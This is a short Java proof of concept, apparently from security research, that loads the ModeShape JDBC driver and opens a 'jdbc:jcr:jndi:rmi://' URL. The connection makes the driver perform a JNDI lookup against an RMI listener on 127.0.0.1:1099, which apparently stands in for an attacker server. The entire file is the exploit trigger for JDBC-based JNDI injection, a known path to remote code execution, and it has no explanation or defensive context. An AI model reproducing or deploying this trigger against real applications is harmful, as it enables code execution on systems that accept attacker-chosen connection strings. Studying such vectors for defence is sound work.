package org.example;

import java.sql.DriverManager;

/**
 * @author Whoopsunix
 */
public class JNDI {
    public static void main(String[] args) throws Exception {
        Class.forName("org.modeshape.jdbc.LocalJcrDriver");

        DriverManager.getConnection("jdbc:jcr:jndi:rmi://127.0.0.1:1099/f64tsv");
    }
}
